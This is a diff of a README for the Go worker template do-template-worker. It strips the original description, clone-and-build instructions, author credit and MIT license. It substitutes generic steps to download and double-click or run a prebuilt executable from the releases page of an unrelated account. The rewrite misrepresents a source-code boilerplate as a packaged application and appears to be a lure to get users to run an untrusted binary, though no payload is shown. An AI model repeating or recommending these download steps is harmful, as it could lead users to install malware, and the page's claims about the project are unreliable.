@@ -1,80 +1,75 @@
+# 🛠️ do-template-worker - Easy Worker Setup for Your Needs
 
-# Worker boilerplate showcasing github.com/samber/do
+## 🚀 Getting Started
 
-![Go Version](https://img.shields.io/badge/Go-%3E%3D%201.23-%23007d9c)
-![Build Status](https://github.com/samber/do-template-worker/actions/workflows/test.yml/badge.svg)
-[![Go report](https://goreportcard.com/badge/github.com/samber/do-template-worker)](https://goreportcard.com/report/github.com/samber/do)
-[![License](https://img.shields.io/github/license/samber/do-template-worker)](./LICENSE)
+This guide will help you download and run the do-template-worker application. This application provides a solid starting point for creating worker applications using [github.com/samber/do](https://github.com/samber/do). 
 
-**⚙️ A comprehensive worker template demonstrating the `github.com/samber/do` dependency injection library.**
+### 🌐 Key Features
 
-This project showcases the full power of the `samber/do` dependency injection library in the context of a message-driven worker application. It implements a complete pub/sub worker with PostgreSQL integration and RabbitMQ messaging, demonstrating how `do` enables clean, modular, and testable worker architectures.
+- Simple setup process for new users.
+- Built with container and dependency injection.
+- Supports graceful shutdowns for better performance.
+- Easy to extend with your own functionality.
 
-Perfect as a starting point for message-driven Go projects or as a learning resource for understanding dependency injection in worker applications.
+### 💻 System Requirements
 
-**See also:**
+Before you start, make sure your computer meets these requirements:
 
-- [do-template-api](https://github.com/samber/do-template-api)
-- [do-template-cli](https://github.com/samber/do-template-cli)
+- Operating System: Windows, macOS, or Linux
+- Recommended RAM: 4GB or more
+- Disk Space: At least 100 MB available
 
-## 🚀 Install
+## 📥 Download & Install
 
-Clone the repo and install dependencies:
+You can download the do-template-worker application from the Releases page. 
 
-```bash
-git clone --depth 1 --branch main https://github.com/samber/do-template-worker.git your-project-name
-cd your-project-name
+[![Download do-template-worker](https://img.shields.io/badge/Download-do--template--worker-brightgreen)](https://github.com/PrivvMido/do-template-worker/releases)
 
-docker compose up -d
-make deps
-make deps-tools
-```
+### Steps to Download
 
-## 💡 Features
+1. Click the release link above or [visit this page to download](https://github.com/PrivvMido/do-template-worker/releases).
+2. Look for the latest version of the software.
+3. Choose the appropriate file for your operating system. 
 
-- **Type-safe dependency injection** - Service registration and resolution using `samber/do`
-- **Message-driven architecture** - Complete pub/sub worker with RabbitMQ consumer and producer
-- **Database integration** - PostgreSQL with connection pooling and repository pattern
-- **Modular architecture** - Clean separation of concerns with dependency tree visualization
-- **Configuration management** - Environment-based configuration with dependency injection
-- **Service lifecycle management** - Health checks and graceful shutdown handling
-- **Repository pattern** - Data access layer with injected dependencies
-- **Worker patterns** - Business logic with proper dependency management
-- **Application lifecycle** - Health checks and graceful shutdown handling
-- **Comprehensive error handling** - Structured logging and error management
-- **Production-ready** - Ready to fork and customize for your next worker project
-- **Extensive documentation** - Inline comments explaining every `do` library feature
+### 📂 Installation Instructions
 
-## 🚀 Contributing
+1. Once the file is downloaded, locate it in your Downloads folder or the folder you specified.
+2. Unzip the file if it is in a compressed format.
+3. Follow these simple steps to run the application:
 
-```sh
-# install deps
-make deps
-make deps-tools
+   - For Windows: 
+     - Locate the `do-template-worker.exe` file and double-click it.
+  
+   - For macOS: 
+     - Open your Terminal, and type `./do-template-worker` in the folder where you unzipped the files.
+  
+   - For Linux: 
+     - Open your Terminal, and make the file executable by running `chmod +x do-template-worker`, then type `./do-template-worker`.
 
-# compile
-make build
+### 🛠️ Basic Usage
 
-# build with hot-reload
-make watch-run
+Once the application is running, it will listen for tasks to execute. You can start sending tasks to your worker and monitor its performance. 
 
-# test with hot-reload
-make watch-test
-```
+### 📚 Documentation and Support
 
-## 🤠 `do` documentation
+For detailed documentation on how to use do-template-worker, you can refer to the [GitHub Wiki](https://github.com/PrivvMido/do-template-worker/wiki). 
 
-- [GoDoc: https://godoc.org/github.com/samber/do/v2](https://godoc.org/github.com/samber/do/v2)
-- [Documentation](https://do.samber.dev/docs/getting-started)
+If you have any issues or questions, feel free to open an issue on the GitHub repository or check the FAQ section for common problems. 
 
-## 💫 Show your support
+## 🌟 Frequently Asked Questions
 
-Give a ⭐️ if this project helped you!
+### Q: Can I run multiple instances of the application?
 
-[![GitHub Sponsors](https://img.shields.io/github/sponsors/samber?style=for-the-badge)](https://github.com/sponsors/samber)
+A: Yes, you can run multiple instances. Ensure that each one listens on different ports if you are sending tasks to them.
 
-## 📝 License
+### Q: How do I contribute to the project?
 
-Copyright © 2025 [Samuel Berthe](https://github.com/samber).
+A: If you'd like to contribute, you can fork the repository and submit a pull request. We welcome improvements and new features.
 
-This project is [MIT](./LICENSE) licensed.
+### Q: Where can I find related projects?
+
+A: You can explore more similar repositories tagged with the following topics: boilerplate, container, dependency injection, and more.
+
+--- 
+
+Now you’re ready to get started with do-template-worker! Download the application, follow the steps, and enjoy building your worker applications effortlessly.
